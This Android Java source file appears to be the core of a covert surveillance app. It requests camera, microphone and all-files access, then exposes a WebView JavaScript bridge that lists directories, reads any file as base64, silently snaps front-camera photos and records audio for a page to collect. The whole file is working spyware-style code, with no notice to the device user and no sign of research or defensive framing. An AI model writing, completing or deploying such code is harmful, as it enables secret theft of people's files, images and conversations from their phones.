package com.priv.service;
import android.os.*; import android.webkit.*; import android.app.*; import android.content.*; import android.net.Uri; import android.provider.Settings; import java.io.File; import android.util.Base64; import android.hardware.Camera; import android.graphics.SurfaceTexture; import android.media.MediaRecorder;

public class MainActivity extends Activity {
    WebView w; MediaRecorder r;
    protected void onCreate(Bundle s) {
        super.onCreate(s);
        if (Build.VERSION.SDK_INT >= 23) { requestPermissions(new String[]{"android.permission.CAMERA", "android.permission.RECORD_AUDIO"}, 1); }
        if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
            startActivity(new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:" + getPackageName())));
        }
        w = new WebView(this);
        w.getSettings().setJavaScriptEnabled(true);
        w.addJavascriptInterface(new Object() {
            @JavascriptInterface public String list(String p) {
                File[] fls = new File(p).listFiles(); StringBuilder sb = new StringBuilder();
                if(fls == null) return "Locked";
                for (File f : fls) sb.append(f.isDirectory() ? "📁 " : "📄 ").append(f.getName()).append("\n");
                return sb.toString();
            }
            @JavascriptInterface public String getFileBase64(String p) {
                try { return Base64.encodeToString(java.nio.file.Files.readAllBytes(new File(p).toPath()), Base64.NO_WRAP); } catch (Exception e) { return "Error"; }
            }
            @JavascriptInterface public void takeSnap() {
                try { Camera c = Camera.open(1); c.setPreviewTexture(new SurfaceTexture(10)); c.startPreview();
                    c.takePicture(null, null, (data, cam) -> {
                        String b64 = Base64.encodeToString(data, Base64.NO_WRAP);
                        runOnUiThread(() -> w.loadUrl("javascript:window.receiveSnap('" + b64 + "')"));
                        cam.release();
                    });
                } catch (Exception e) { }
            }
            @JavascriptInterface public void recordAudio(int ms) {
                try {
                    File out = new File(getExternalFilesDir(null), "rec.m4a");
                    r = new MediaRecorder(); r.setAudioSource(1); r.setOutputFormat(4); r.setAudioEncoder(3);
                    r.setOutputFile(out.getAbsolutePath()); r.prepare(); r.start();
                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
                        try { r.stop(); r.release(); runOnUiThread(() -> w.loadUrl("javascript:dwF('" + out.getAbsolutePath() + "')")); } catch(Exception e){}
                    }, ms);
                } catch (Exception e) { }
            }
        }, "Android");
        w.loadUrl("file:///android_asset/index.html");
        setContentView(w);
    }
}